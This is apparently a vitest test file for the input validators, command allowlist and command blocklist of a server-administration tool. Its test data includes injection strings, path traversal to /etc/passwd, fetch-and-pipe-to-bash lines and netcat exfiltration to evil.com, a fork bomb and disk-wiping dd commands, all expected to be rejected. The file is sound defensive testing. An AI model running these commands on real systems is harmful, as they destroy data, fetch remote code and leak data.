// M5.1+M5.5: Comprehensive security validator tests
// @see docs/SECURITY.md

import { describe, it, expect } from 'vitest';
import {
  validatePath,
  validateAndSanitizePath,
  validateContainerId,
  validateDockerImageRef,
  validatePid,
  validateSignal,
  validateServiceName,
  validateISODate,
  validateLogSource,
  validatePositiveInt,
  shellEscape,
  validateCommand,
  matchAllowedCommand,
  isBlockedCommand,
  SecurityError,
  sanitizeErrorMessage,
  ALLOWED_COMMANDS,
  BLOCKED_COMMANDS,
  validateIpAddress,
  validateJailName,
  validateCidr,
  validatePortRange,
  validateUfwAppName,
  validateNginxSiteName,
  validatePackageName,
  validateSearchQuery,
  validateCronSchedule,
  validateCronCommand,
  validateCronIndex,
  validateUsername,
  validateTty,
  validateGroupName,
  validateHostname,
  validateInterfaceName,
  validateLogPriority,
  validateGrepPattern,
  validateDateParam,
} from '../../src/security/validators';

// ---------------------------------------------------------------------------
// Path Validation
// ---------------------------------------------------------------------------

describe('validatePath (boolean)', () => {
  it('accepts valid absolute paths', () => {
    expect(validatePath('/')).toBe(true);
    expect(validatePath('/home')).toBe(true);
    expect(validatePath('/home/user/documents')).toBe(true);
    expect(validatePath('/var/log/syslog')).toBe(true);
    expect(validatePath('/tmp/file.txt')).toBe(true);
  });

  it('rejects relative paths', () => {
    expect(validatePath('home/user')).toBe(false);
    expect(validatePath('file.txt')).toBe(false);
    expect(validatePath('./relative')).toBe(false);
  });

  it('rejects null bytes', () => {
    expect(validatePath('/home/user\0')).toBe(false);
    expect(validatePath('/tmp/file\0.txt')).toBe(false);
  });

  it('rejects empty and invalid input', () => {
    expect(validatePath('')).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validatePath(null)).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validatePath(undefined)).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validatePath(123)).toBe(false);
  });

  it('rejects blocked paths', () => {
    expect(validatePath('/proc/sysrq-trigger')).toBe(false);
    expect(validatePath('/dev/sda')).toBe(false);
    expect(validatePath('/dev/sda1')).toBe(false);
  });
});

describe('validateAndSanitizePath', () => {
  it('returns normalized path for valid input', () => {
    expect(validateAndSanitizePath('/home/user')).toBe('/home/user');
    expect(validateAndSanitizePath('/home/user//docs')).toBe('/home/user/docs');
    expect(validateAndSanitizePath('/home/user/./docs')).toBe('/home/user/docs');
  });

  it('throws SecurityError for relative paths', () => {
    expect(() => validateAndSanitizePath('relative/path')).toThrow(SecurityError);
    expect(() => validateAndSanitizePath('relative/path')).toThrow('Path must be absolute');
  });

  it('throws SecurityError for traversal attacks', () => {
    expect(() => validateAndSanitizePath('../../etc/passwd')).toThrow(SecurityError);
  });

  it('throws SecurityError for null bytes', () => {
    expect(() => validateAndSanitizePath('/home\0bypass')).toThrow('Null byte in path');
  });

  it('throws SecurityError for blocked paths', () => {
    expect(() => validateAndSanitizePath('/proc/sysrq-trigger')).toThrow('restricted');
    expect(() => validateAndSanitizePath('/dev/sda')).toThrow('restricted');
  });

  it('throws SecurityError for empty input', () => {
    expect(() => validateAndSanitizePath('')).toThrow(SecurityError);
  });

  it('normalizes paths with resolved traversal that remains valid', () => {
    // /home/../etc/passwd normalizes to /etc/passwd (no .. left) — valid
    expect(validateAndSanitizePath('/home/../etc/passwd')).toBe('/etc/passwd');
  });
});

// ---------------------------------------------------------------------------
// Container ID Validation
// ---------------------------------------------------------------------------

describe('validateContainerId', () => {
  it('accepts valid hex container IDs (12-64 chars)', () => {
    expect(validateContainerId('abc123def456')).toBe(true);       // 12 chars
    expect(validateContainerId('deadbeefcafe')).toBe(true);       // 12 chars
    expect(validateContainerId('1234567890abcdef')).toBe(true);   // 16 chars
    expect(validateContainerId('a'.repeat(64))).toBe(true);       // 64 chars (full SHA)
  });

  it('rejects IDs shorter than 12 characters', () => {
    expect(validateContainerId('abc123')).toBe(false);            // 6 chars
    expect(validateContainerId('deadbeef')).toBe(false);          // 8 chars
    expect(validateContainerId('abc123def45')).toBe(false);       // 11 chars
  });

  it('rejects IDs longer than 64 characters', () => {
    expect(validateContainerId('a'.repeat(65))).toBe(false);
  });

  it('rejects non-hex characters', () => {
    expect(validateContainerId('xyz123456789')).toBe(false);
    expect(validateContainerId('abc-12345678')).toBe(false);
    expect(validateContainerId('ABC123456789')).toBe(false);      // uppercase not allowed
    expect(validateContainerId('')).toBe(false);
  });

  it('rejects injection attempts', () => {
    expect(validateContainerId('abc123456789; rm -rf /')).toBe(false);
    expect(validateContainerId('abc123456789$(whoami)')).toBe(false);
    expect(validateContainerId('abc12345678`id`')).toBe(false);
  });

  it('rejects null/undefined', () => {
    // @ts-expect-error — testing runtime safety
    expect(validateContainerId(null)).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validateContainerId(undefined)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Docker Image Reference Validation
// ---------------------------------------------------------------------------

describe('validateDockerImageRef', () => {
  it('accepts valid image references', () => {
    expect(validateDockerImageRef('nginx')).toBe(true);
    expect(validateDockerImageRef('nginx:latest')).toBe(true);
    expect(validateDockerImageRef('nginx:1.25')).toBe(true);
    expect(validateDockerImageRef('docker.io/library/nginx:latest')).toBe(true);
    expect(validateDockerImageRef('ghcr.io/user/repo:v1.2.3')).toBe(true);
    expect(validateDockerImageRef('my-registry.com:5000/app:v2')).toBe(true);
  });

  it('rejects shell metacharacters', () => {
    expect(validateDockerImageRef('nginx; rm -rf /')).toBe(false);
    expect(validateDockerImageRef('nginx$(whoami)')).toBe(false);
    expect(validateDockerImageRef('image`id`')).toBe(false);
    expect(validateDockerImageRef('nginx | cat /etc/passwd')).toBe(false);
    expect(validateDockerImageRef('image&& echo hacked')).toBe(false);
  });

  it('rejects images exceeding max length', () => {
    expect(validateDockerImageRef('a'.repeat(257))).toBe(false);
  });

  it('rejects empty or invalid starts', () => {
    expect(validateDockerImageRef('')).toBe(false);
    expect(validateDockerImageRef('.hidden')).toBe(false);
    expect(validateDockerImageRef('-prefixed')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// PID Validation
// ---------------------------------------------------------------------------

describe('validatePid', () => {
  it('accepts valid PIDs', () => {
    expect(validatePid('1')).toBe(true);           // init
    expect(validatePid('12345')).toBe(true);
    expect(validatePid('32768')).toBe(true);
    expect(validatePid('4194304')).toBe(true);      // max on 64-bit
  });

  it('rejects PID 0', () => {
    expect(validatePid('0')).toBe(false);
  });

  it('rejects PIDs above max', () => {
    expect(validatePid('4194305')).toBe(false);
    expect(validatePid('99999999')).toBe(false);
  });

  it('rejects non-numeric values', () => {
    expect(validatePid('')).toBe(false);
    expect(validatePid('abc')).toBe(false);
    expect(validatePid('12.5')).toBe(false);
    expect(validatePid('-1')).toBe(false);
    expect(validatePid('1; rm -rf /')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Signal Validation
// ---------------------------------------------------------------------------

describe('validateSignal', () => {
  it('accepts valid signals (1-31)', () => {
    expect(validateSignal(1)).toBe(true);    // SIGHUP
    expect(validateSignal(9)).toBe(true);    // SIGKILL
    expect(validateSignal(15)).toBe(true);   // SIGTERM
    expect(validateSignal(31)).toBe(true);
  });

  it('rejects out-of-range signals', () => {
    expect(validateSignal(0)).toBe(false);
    expect(validateSignal(32)).toBe(false);
    expect(validateSignal(-1)).toBe(false);
    expect(validateSignal(100)).toBe(false);
  });

  it('rejects non-integers', () => {
    expect(validateSignal(1.5)).toBe(false);
    expect(validateSignal(NaN)).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validateSignal('9')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Service Name Validation
// ---------------------------------------------------------------------------

describe('validateServiceName', () => {
  it('accepts valid service names', () => {
    expect(validateServiceName('nginx')).toBe(true);
    expect(validateServiceName('my-service')).toBe(true);
    expect(validateServiceName('my_service')).toBe(true);
    expect(validateServiceName('service.name')).toBe(true);
    expect(validateServiceName('app2')).toBe(true);
    expect(validateServiceName('getty@tty1.service')).toBe(true);  // template unit
    expect(validateServiceName('sshd')).toBe(true);
  });

  it('rejects service names exceeding 256 characters', () => {
    expect(validateServiceName('a'.repeat(257))).toBe(false);
  });

  it('accepts service names up to 256 characters', () => {
    expect(validateServiceName('a'.repeat(256))).toBe(true);
  });

  it('rejects invalid characters', () => {
    expect(validateServiceName('')).toBe(false);
    expect(validateServiceName('my service')).toBe(false);     // spaces
    expect(validateServiceName('$(whoami)')).toBe(false);
    expect(validateServiceName('nginx; rm -rf /')).toBe(false);
    expect(validateServiceName('a/b')).toBe(false);
    expect(validateServiceName('service|pipe')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// ISO Date Validation
// ---------------------------------------------------------------------------

describe('validateISODate', () => {
  it('accepts valid ISO date strings', () => {
    expect(validateISODate('2024-01-15')).toBe(true);
    expect(validateISODate('2024-12-31T23:59:59')).toBe(true);
    expect(validateISODate('2024-01-15T10:30:00Z')).toBe(true);
    expect(validateISODate('2024-01-15T10:30:00+05:30')).toBe(true);
    expect(validateISODate('2024-01-15T10:30:00-08:00')).toBe(true);
  });

  it('rejects dates with injection payload', () => {
    expect(validateISODate('2024-01-01; rm -rf /')).toBe(false);
    expect(validateISODate('2024-01-01$(whoami)')).toBe(false);
    expect(validateISODate('2024-01-01`id`')).toBe(false);
  });

  it('rejects invalid date formats', () => {
    expect(validateISODate('')).toBe(false);
    expect(validateISODate('not-a-date')).toBe(false);
    expect(validateISODate('01-15-2024')).toBe(false);
    expect(validateISODate('2024/01/15')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Log Source Validation
// ---------------------------------------------------------------------------

describe('validateLogSource', () => {
  it('accepts valid log sources', () => {
    expect(validateLogSource('journal')).toBe(true);
    expect(validateLogSource('dmesg')).toBe(true);
    expect(validateLogSource('syslog')).toBe(true);
  });

  it('rejects invalid log sources', () => {
    expect(validateLogSource('invalid')).toBe(false);
    expect(validateLogSource('')).toBe(false);
    expect(validateLogSource('Journal')).toBe(false);  // case-sensitive
    expect(validateLogSource('kern.log')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Positive Integer Validation
// ---------------------------------------------------------------------------

describe('validatePositiveInt', () => {
  it('accepts valid positive integers within range', () => {
    expect(validatePositiveInt('1')).toBe(true);
    expect(validatePositiveInt('100')).toBe(true);
    expect(validatePositiveInt('10000')).toBe(true);
  });

  it('rejects zero and negative values', () => {
    expect(validatePositiveInt('0')).toBe(false);
    expect(validatePositiveInt('-1')).toBe(false);
  });

  it('rejects values above max', () => {
    expect(validatePositiveInt('10001')).toBe(false);
    expect(validatePositiveInt('5', 4)).toBe(false);
  });

  it('respects custom max', () => {
    expect(validatePositiveInt('50', 100)).toBe(true);
    expect(validatePositiveInt('101', 100)).toBe(false);
  });

  it('rejects non-numeric values', () => {
    expect(validatePositiveInt('')).toBe(false);
    expect(validatePositiveInt('abc')).toBe(false);
    expect(validatePositiveInt('12.5')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Shell Escaping
// ---------------------------------------------------------------------------

describe('shellEscape', () => {
  it('wraps strings in single quotes', () => {
    expect(shellEscape('hello')).toBe("'hello'");
    expect(shellEscape('/home/user')).toBe("'/home/user'");
  });

  it('escapes single quotes within strings', () => {
    expect(shellEscape("it's")).toBe("'it'\\''s'");
    expect(shellEscape("O'Brien")).toBe("'O'\\''Brien'");
  });

  it('handles empty strings', () => {
    expect(shellEscape('')).toBe("''");
  });

  it('neutralizes injection attempts', () => {
    const malicious = "'; rm -rf /; echo '";
    const escaped = shellEscape(malicious);
    expect(escaped.startsWith("'")).toBe(true);
    expect(escaped.endsWith("'")).toBe(true);
    expect(escaped).toContain("\\'");
  });

  it('handles non-string input gracefully', () => {
    // @ts-expect-error — testing runtime safety
    expect(shellEscape(null)).toBe("''");
    // @ts-expect-error — testing runtime safety
    expect(shellEscape(undefined)).toBe("''");
    // @ts-expect-error — testing runtime safety
    expect(shellEscape(123)).toBe("''");
  });

  it('handles strings with backticks', () => {
    expect(shellEscape('hello`whoami`world')).toBe("'hello`whoami`world'");
  });

  it('handles strings with dollar signs', () => {
    expect(shellEscape('$HOME')).toBe("'$HOME'");
    expect(shellEscape('$(whoami)')).toBe("'$(whoami)'");
  });

  it('handles strings with semicolons', () => {
    expect(shellEscape('cmd; evil')).toBe("'cmd; evil'");
  });
});

// ---------------------------------------------------------------------------
// Command Allowlist
// ---------------------------------------------------------------------------

describe('matchAllowedCommand', () => {
  it('matches system info commands', () => {
    expect(matchAllowedCommand('hostname')).not.toBeNull();
    expect(matchAllowedCommand('uptime')).not.toBeNull();
    expect(matchAllowedCommand('uname -a')).not.toBeNull();
    expect(matchAllowedCommand('df -h')).not.toBeNull();
    expect(matchAllowedCommand('free -m')).not.toBeNull();
    expect(matchAllowedCommand('ps aux')).not.toBeNull();
    expect(matchAllowedCommand('cat /proc/cpuinfo')).not.toBeNull();
  });

  it('matches docker commands', () => {
    expect(matchAllowedCommand('docker ps')).not.toBeNull();
    expect(matchAllowedCommand('docker ps -a')).not.toBeNull();
    expect(matchAllowedCommand('docker images')).not.toBeNull();
    expect(matchAllowedCommand('docker start abc123def456')).not.toBeNull();
    expect(matchAllowedCommand('docker stop abc123def456')).not.toBeNull();
    expect(matchAllowedCommand('docker rm abc123def456')).not.toBeNull();
  });

  it('matches systemctl commands', () => {
    expect(matchAllowedCommand('systemctl list-units --type=service')).not.toBeNull();
    expect(matchAllowedCommand('sudo systemctl start nginx')).not.toBeNull();
    expect(matchAllowedCommand('sudo systemctl stop nginx')).not.toBeNull();
    expect(matchAllowedCommand('sudo systemctl restart sshd')).not.toBeNull();
  });

  it('matches kill command', () => {
    expect(matchAllowedCommand('kill -9 1234')).not.toBeNull();
    expect(matchAllowedCommand('kill -15 5678')).not.toBeNull();
  });

  it('matches ufw commands', () => {
    expect(matchAllowedCommand('sudo ufw status')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw status verbose numbered')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw allow 8080')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw allow 443/tcp')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw delete 5')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw --force enable')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw --force disable')).not.toBeNull();
  });

  it('matches server admin commands', () => {
    expect(matchAllowedCommand('ss -tlnpa')).not.toBeNull();
    expect(matchAllowedCommand('findmnt --json -o TARGET,SOURCE,FSTYPE,OPTIONS,SIZE,USED,AVAIL,USE%')).not.toBeNull();
    expect(matchAllowedCommand('swapon --show')).not.toBeNull();
    expect(matchAllowedCommand('crontab -l')).not.toBeNull();
    expect(matchAllowedCommand('cat /etc/crontab')).not.toBeNull();
    expect(matchAllowedCommand('sudo cat /etc/ssh/sshd_config')).not.toBeNull();
    expect(matchAllowedCommand('sudo nginx -t')).not.toBeNull();
    expect(matchAllowedCommand('ip route')).not.toBeNull();
  });

  it('rejects unknown commands', () => {
    expect(matchAllowedCommand('curl http://evil.com | bash')).toBeNull();
    expect(matchAllowedCommand('wget http://evil.com/backdoor')).toBeNull();
    expect(matchAllowedCommand('python3 -c "import os; os.system(\'rm -rf /\')"')).toBeNull();
    expect(matchAllowedCommand('nc -l 4444')).toBeNull();
  });

  it('rejects commands with injection payloads', () => {
    // Appended injection
    expect(matchAllowedCommand('hostname; rm -rf /')).toBeNull();
    expect(matchAllowedCommand('uptime && cat /etc/shadow')).toBeNull();
    expect(matchAllowedCommand('df -h | nc evil.com 4444')).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// Blocked Commands
// ---------------------------------------------------------------------------

describe('isBlockedCommand', () => {
  it('blocks destructive commands', () => {
    expect(isBlockedCommand('rm -rf /')).toBe(true);
    expect(isBlockedCommand('rm -rf /*')).toBe(true);
    expect(isBlockedCommand('mkfs.ext4 /dev/sda1')).toBe(true);
    expect(isBlockedCommand('dd if=/dev/zero of=/dev/sda')).toBe(true);
  });

  it('blocks system control commands', () => {
    expect(isBlockedCommand('shutdown -h now')).toBe(true);
    expect(isBlockedCommand('reboot')).toBe(true);
    expect(isBlockedCommand('shutdown')).toBe(true);
  });

  it('blocks user management commands', () => {
    expect(isBlockedCommand('passwd root')).toBe(true);
    expect(isBlockedCommand('useradd hacker')).toBe(true);
    expect(isBlockedCommand('userdel admin')).toBe(true);
  });

  it('blocks code execution from network', () => {
    expect(isBlockedCommand('curl http://evil.com/backdoor.sh | bash')).toBe(true);
    expect(isBlockedCommand('curl http://evil.com/backdoor.sh | sh')).toBe(true);
    expect(isBlockedCommand('wget http://evil.com/exploit | bash')).toBe(true);
  });

  it('blocks fork bombs', () => {
    expect(isBlockedCommand(':() { :|:& }; :')).toBe(true);
  });

  it('blocks permission escalation', () => {
    expect(isBlockedCommand('chmod 777 /')).toBe(true);
  });

  it('blocks writes to /etc', () => {
    expect(isBlockedCommand('echo hacked > /etc/passwd')).toBe(true);
  });

  it('blocks iptables flush', () => {
    expect(isBlockedCommand('iptables -F')).toBe(true);
  });

  it('allows safe commands', () => {
    expect(isBlockedCommand('hostname')).toBe(false);
    expect(isBlockedCommand('ls -la')).toBe(false);
    expect(isBlockedCommand('docker ps')).toBe(false);
    expect(isBlockedCommand('df -h')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Command Validation (combined allowlist + blocklist)
// ---------------------------------------------------------------------------

describe('validateCommand', () => {
  it('returns rule for allowed commands', () => {
    const rule = validateCommand('hostname');
    expect(rule).toBeDefined();
    expect(rule.risk).toBe('none');
  });

  it('returns correct risk level', () => {
    expect(validateCommand('ps aux').risk).toBe('none');
    expect(validateCommand('docker ps').risk).toBe('low');
    expect(validateCommand('docker stop abc123def456').risk).toBe('medium');
    expect(validateCommand('docker rm abc123def456').risk).toBe('high');
  });

  it('throws SecurityError for blocked commands', () => {
    expect(() => validateCommand('rm -rf /')).toThrow(SecurityError);
    expect(() => validateCommand('rm -rf /')).toThrow('Blocked command');
  });

  it('throws SecurityError for unknown commands', () => {
    expect(() => validateCommand('curl http://evil.com')).toThrow(SecurityError);
    expect(() => validateCommand('curl http://evil.com')).toThrow('not in allowlist');
  });

  it('throws SecurityError for empty input', () => {
    expect(() => validateCommand('')).toThrow(SecurityError);
    // @ts-expect-error — testing runtime safety
    expect(() => validateCommand(null)).toThrow(SecurityError);
  });

  it('blocklist takes precedence over allowlist', () => {
    // Even if 'shutdown' somehow matched an allowlist pattern, blocklist wins
    expect(() => validateCommand('shutdown -h now')).toThrow(SecurityError);
  });
});

// ---------------------------------------------------------------------------
// Error Sanitization
// ---------------------------------------------------------------------------

describe('sanitizeErrorMessage', () => {
  it('redacts file paths', () => {
    const result = sanitizeErrorMessage('Error: cannot open /etc/shadow');
    expect(result).not.toContain('/etc/shadow');
    expect(result).toContain('[path]');
  });

  it('redacts IP addresses', () => {
    const result = sanitizeErrorMessage('Connection to 192.168.1.100 refused');
    expect(result).not.toContain('192.168.1.100');
    expect(result).toContain('[ip]');
  });

  it('truncates long messages', () => {
    const long = 'a'.repeat(1000);
    const result = sanitizeErrorMessage(long);
    expect(result.length).toBeLessThanOrEqual(503); // 500 + "..."
  });

  it('handles empty/null input', () => {
    expect(sanitizeErrorMessage('')).toBe('An unknown error occurred');
    // @ts-expect-error — testing runtime safety
    expect(sanitizeErrorMessage(null)).toBe('An unknown error occurred');
  });
});

// ---------------------------------------------------------------------------
// Constants integrity checks
// ---------------------------------------------------------------------------

describe('Security constants', () => {
  it('ALLOWED_COMMANDS has expected minimum entries', () => {
    expect(ALLOWED_COMMANDS.size).toBeGreaterThanOrEqual(40);
  });

  it('BLOCKED_COMMANDS has expected minimum entries', () => {
    expect(BLOCKED_COMMANDS.length).toBeGreaterThanOrEqual(15);
  });

  it('no overlap: docker stop with valid ID should be allowed, not blocked', () => {
    const cmd = 'docker stop abc123def456';
    expect(matchAllowedCommand(cmd)).not.toBeNull();
    expect(isBlockedCommand(cmd)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// M8.1: IP Address Validation
// ---------------------------------------------------------------------------

describe('validateIpAddress', () => {
  it('accepts valid IPv4 addresses', () => {
    expect(validateIpAddress('192.168.1.1')).toBe(true);
    expect(validateIpAddress('10.0.0.1')).toBe(true);
    expect(validateIpAddress('255.255.255.255')).toBe(true);
    expect(validateIpAddress('0.0.0.0')).toBe(true);
    expect(validateIpAddress('172.16.0.100')).toBe(true);
    expect(validateIpAddress('1.2.3.4')).toBe(true);
  });

  it('accepts valid IPv6 addresses', () => {
    expect(validateIpAddress('::1')).toBe(true);
    expect(validateIpAddress('fe80::1')).toBe(true);
    expect(validateIpAddress('2001:db8::1')).toBe(true);
  });

  it('rejects invalid IPv4 addresses', () => {
    expect(validateIpAddress('999.999.999.999')).toBe(false);
    expect(validateIpAddress('256.1.1.1')).toBe(false);
    expect(validateIpAddress('1.2.3.256')).toBe(false);
    expect(validateIpAddress('1.2.3')).toBe(false);
    expect(validateIpAddress('1.2.3.4.5')).toBe(false);
    expect(validateIpAddress('abc.def.ghi.jkl')).toBe(false);
  });

  it('rejects non-IP strings', () => {
    expect(validateIpAddress('')).toBe(false);
    expect(validateIpAddress('hello')).toBe(false);
    expect(validateIpAddress('not-an-ip')).toBe(false);
    expect(validateIpAddress('192.168.1.1; rm -rf /')).toBe(false);
    expect(validateIpAddress('$(whoami)')).toBe(false);
  });

  it('rejects command injection attempts', () => {
    expect(validateIpAddress('1.2.3.4 && echo pwned')).toBe(false);
    expect(validateIpAddress('1.2.3.4; cat /etc/passwd')).toBe(false);
    expect(validateIpAddress('1.2.3.4`id`')).toBe(false);
    expect(validateIpAddress('1.2.3.4|whoami')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// M8.1: Jail Name Validation
// ---------------------------------------------------------------------------

describe('validateJailName', () => {
  it('accepts valid jail names', () => {
    expect(validateJailName('sshd')).toBe(true);
    expect(validateJailName('nginx-http-auth')).toBe(true);
    expect(validateJailName('apache-auth')).toBe(true);
    expect(validateJailName('postfix')).toBe(true);
    expect(validateJailName('dovecot')).toBe(true);
    expect(validateJailName('recidive')).toBe(true);
    expect(validateJailName('my_custom_jail')).toBe(true);
    expect(validateJailName('jail.v2')).toBe(true);
  });

  it('rejects empty and invalid names', () => {
    expect(validateJailName('')).toBe(false);
    expect(validateJailName(' ')).toBe(false);
  });

  it('rejects names with special characters', () => {
    expect(validateJailName('jail;drop')).toBe(false);
    expect(validateJailName('jail && rm -rf /')).toBe(false);
    expect(validateJailName('jail`id`')).toBe(false);
    expect(validateJailName('jail$(whoami)')).toBe(false);
    expect(validateJailName('jail|cat')).toBe(false);
    expect(validateJailName('../etc/passwd')).toBe(false);
  });

  it('rejects names that are too long', () => {
    expect(validateJailName('a'.repeat(65))).toBe(false);
    // 64 chars should be fine
    expect(validateJailName('a'.repeat(64))).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// M8.2: CIDR Validation
// ---------------------------------------------------------------------------

describe('validateCidr', () => {
  it('accepts valid CIDR notations', () => {
    expect(validateCidr('10.0.0.0/8')).toBe(true);
    expect(validateCidr('192.168.1.0/24')).toBe(true);
    expect(validateCidr('172.16.0.0/12')).toBe(true);
    expect(validateCidr('0.0.0.0/0')).toBe(true);
    expect(validateCidr('255.255.255.255/32')).toBe(true);
  });

  it('rejects invalid CIDR notations', () => {
    expect(validateCidr('10.0.0.0')).toBe(false);       // no prefix
    expect(validateCidr('10.0.0.0/33')).toBe(false);    // prefix > 32
    expect(validateCidr('10.0.0.0/-1')).toBe(false);    // negative prefix
    expect(validateCidr('999.0.0.0/8')).toBe(false);    // invalid IP
    expect(validateCidr('abc/24')).toBe(false);          // non-IP
    expect(validateCidr('')).toBe(false);
    expect(validateCidr('10.0.0.0/8; rm -rf /')).toBe(false);
  });

  it('rejects non-CIDR formats', () => {
    expect(validateCidr('192.168.1.0/abc')).toBe(false);
    expect(validateCidr('/24')).toBe(false);
    expect(validateCidr('10.0.0.0/')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// M8.2: Port Range Validation
// ---------------------------------------------------------------------------

describe('validatePortRange', () => {
  it('accepts valid single ports', () => {
    expect(validatePortRange('80')).toBe(true);
    expect(validatePortRange('1')).toBe(true);
    expect(validatePortRange('443')).toBe(true);
    expect(validatePortRange('65535')).toBe(true);
  });

  it('accepts valid port ranges', () => {
    expect(validatePortRange('8000:9000')).toBe(true);
    expect(validatePortRange('1:65535')).toBe(true);
    expect(validatePortRange('80:443')).toBe(true);
  });

  it('rejects invalid ports', () => {
    expect(validatePortRange('0')).toBe(false);         // 0 not valid
    expect(validatePortRange('65536')).toBe(false);     // > 65535
    expect(validatePortRange('-1')).toBe(false);
    expect(validatePortRange('abc')).toBe(false);
    expect(validatePortRange('')).toBe(false);
  });

  it('rejects invalid port ranges', () => {
    expect(validatePortRange('9000:8000')).toBe(false);  // start > end
    expect(validatePortRange('80:80')).toBe(false);      // start == end
    expect(validatePortRange('0:80')).toBe(false);       // 0 not valid
    expect(validatePortRange('80:65536')).toBe(false);   // > 65535
  });

  it('rejects injection attempts', () => {
    expect(validatePortRange('80; rm -rf /')).toBe(false);
    expect(validatePortRange('80:90:100')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// M8.2: UFW App Name Validation
// ---------------------------------------------------------------------------

describe('validateUfwAppName', () => {
  it('accepts valid UFW app names', () => {
    expect(validateUfwAppName('Nginx Full')).toBe(true);
    expect(validateUfwAppName('Nginx HTTP')).toBe(true);
    expect(validateUfwAppName('OpenSSH')).toBe(true);
    expect(validateUfwAppName('Apache')).toBe(true);
    expect(validateUfwAppName('Postfix')).toBe(true);
    expect(validateUfwAppName('my-app_v2.0')).toBe(true);
    expect(validateUfwAppName('app/subpath')).toBe(true);
  });

  it('rejects empty or whitespace names', () => {
    expect(validateUfwAppName('')).toBe(false);
    expect(validateUfwAppName('   ')).toBe(false);
  });

  it('rejects names with dangerous characters', () => {
    expect(validateUfwAppName('app; rm -rf /')).toBe(false);
    expect(validateUfwAppName('app`id`')).toBe(false);
    expect(validateUfwAppName('app$(whoami)')).toBe(false);
    expect(validateUfwAppName('app|cat')).toBe(false);
    expect(validateUfwAppName('app&bg')).toBe(false);
  });

  it('rejects names that are too long', () => {
    expect(validateUfwAppName('a'.repeat(129))).toBe(false);
    expect(validateUfwAppName('a'.repeat(128))).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// M8.3: Nginx Site Name Validation
// ---------------------------------------------------------------------------

describe('validateNginxSiteName', () => {
  it('accepts valid site names', () => {
    expect(validateNginxSiteName('default')).toBe(true);
    expect(validateNginxSiteName('example.com')).toBe(true);
    expect(validateNginxSiteName('my-site.conf')).toBe(true);
    expect(validateNginxSiteName('app_v2')).toBe(true);
    expect(validateNginxSiteName('001-reverse-proxy')).toBe(true);
  });

  it('rejects empty or whitespace names', () => {
    expect(validateNginxSiteName('')).toBe(false);
    expect(validateNginxSiteName('   ')).toBe(false);
  });

  it('rejects path traversal attempts', () => {
    expect(validateNginxSiteName('../etc/passwd')).toBe(false);
    expect(validateNginxSiteName('..%2fetc%2fpasswd')).toBe(false);
    expect(validateNginxSiteName('my-site/../../etc')).toBe(false);
  });

  it('rejects names with slashes', () => {
    expect(validateNginxSiteName('sites/default')).toBe(false);
    expect(validateNginxSiteName('path\\to\\site')).toBe(false);
  });

  it('rejects command injection attempts', () => {
    expect(validateNginxSiteName('site; rm -rf /')).toBe(false);
    expect(validateNginxSiteName('site`id`')).toBe(false);
    expect(validateNginxSiteName('site$(whoami)')).toBe(false);
    expect(validateNginxSiteName('site|cat')).toBe(false);
  });

  it('rejects overly long names', () => {
    expect(validateNginxSiteName('a'.repeat(129))).toBe(false);
    expect(validateNginxSiteName('a'.repeat(128))).toBe(true);
  });
});

describe('validatePackageName', () => {
  it('accepts valid package names', () => {
    expect(validatePackageName('nginx')).toBe(true);
    expect(validatePackageName('python3')).toBe(true);
    expect(validatePackageName('libc6')).toBe(true);
    expect(validatePackageName('libssl-dev')).toBe(true);
    expect(validatePackageName('g++')).toBe(true);
    expect(validatePackageName('libc6:amd64')).toBe(true);
    expect(validatePackageName('python3.11')).toBe(true);
  });

  it('rejects empty and whitespace', () => {
    expect(validatePackageName('')).toBe(false);
    expect(validatePackageName('   ')).toBe(false);
  });

  it('rejects names with spaces', () => {
    expect(validatePackageName('nginx common')).toBe(false);
  });

  it('rejects shell injection', () => {
    expect(validatePackageName('nginx; rm -rf /')).toBe(false);
    expect(validatePackageName('pkg`id`')).toBe(false);
    expect(validatePackageName('pkg$(whoami)')).toBe(false);
    expect(validatePackageName('pkg|cat')).toBe(false);
    expect(validatePackageName('pkg && echo')).toBe(false);
  });

  it('rejects path separators', () => {
    expect(validatePackageName('../etc/passwd')).toBe(false);
    expect(validatePackageName('pkg/test')).toBe(false);
  });

  it('rejects overly long names', () => {
    expect(validatePackageName('a'.repeat(201))).toBe(false);
    expect(validatePackageName('a'.repeat(200))).toBe(true);
  });
});

describe('validateSearchQuery', () => {
  it('accepts valid search queries', () => {
    expect(validateSearchQuery('nginx')).toBe(true);
    expect(validateSearchQuery('python3')).toBe(true);
    expect(validateSearchQuery('lib')).toBe(true);
    expect(validateSearchQuery('node-js')).toBe(true);
    expect(validateSearchQuery('g++')).toBe(true);
    expect(validateSearchQuery('python3.11')).toBe(true);
  });

  it('rejects empty and whitespace', () => {
    expect(validateSearchQuery('')).toBe(false);
    expect(validateSearchQuery('   ')).toBe(false);
  });

  it('rejects shell injection', () => {
    expect(validateSearchQuery('pkg; rm -rf /')).toBe(false);
    expect(validateSearchQuery('pkg`id`')).toBe(false);
    expect(validateSearchQuery('$(whoami)')).toBe(false);
  });

  it('rejects overly long queries', () => {
    expect(validateSearchQuery('a'.repeat(101))).toBe(false);
    expect(validateSearchQuery('a'.repeat(100))).toBe(true);
  });
});

